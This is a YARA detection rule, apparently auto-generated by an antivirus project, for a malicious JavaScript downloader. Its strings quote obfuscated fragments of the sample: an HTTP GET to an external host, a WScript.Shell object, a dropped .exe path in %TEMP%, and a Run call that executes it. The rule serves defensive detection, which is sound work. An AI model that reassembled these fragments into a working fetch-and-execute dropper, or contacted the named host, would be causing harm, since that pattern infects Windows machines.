rule sig_20160330_4953c30a22f7dd2b4db1fb016325d849 {
  meta:
    description = "datamaliciousorder - file 20160330_4953c30a22f7dd2b4db1fb016325d849.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2724dc2c07c71c46b3e01d6d365cf711d1f97e0240ee06b8753e7135094a22ca"

  strings:
    $s1  = "PJ[J](\"GET\", \"http://beimeihuifu.com/n7dja\", false);" fullword ascii
    $s2  = "var V = function UZ() {return WScript[N](\"WScript\"+\".Shell\");}(), ME = 11;" fullword ascii
    $s3  = "function KT(DL, HX){TK = TK * 1; return DL - HX;};" fullword ascii
    $s4  = "if (PJ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WO(){return X + \"\";};" fullword ascii
    $s6  = "function YC() {return V[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VL15F6Mc.ex\" + \"e\";};" fullword ascii
    $s7  = "function R() {return ((W0 == true) && (W0 == C0)) ? 1 : TK;};" fullword ascii
    $s8  = "function NY(DM){V[\"Run\"](DM, TK, TK);};" fullword ascii
    $s9  = "return KT(NV, G);" fullword ascii
    $s10 = "function MZ()" fullword ascii
    $s11 = "}while (U);" fullword ascii
    $s12 = "var CM = new this[\"Date\"]();" fullword ascii
    $s13 = "function KQ(){return N;};" fullword ascii
    $s14 = "function JW(){return 22;};" fullword ascii
    $s15 = "function C(AP) {var W = (1, 2, 3, 4, 5, AP); return W;};" fullword ascii
    $s16 = "var W0 = false;" fullword ascii
    $s17 = "W0 = true; " fullword ascii
    $s18 = "var C0 = false;" fullword ascii
    $s19 = "var HG = false;" fullword ascii
    $s20 = "C0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}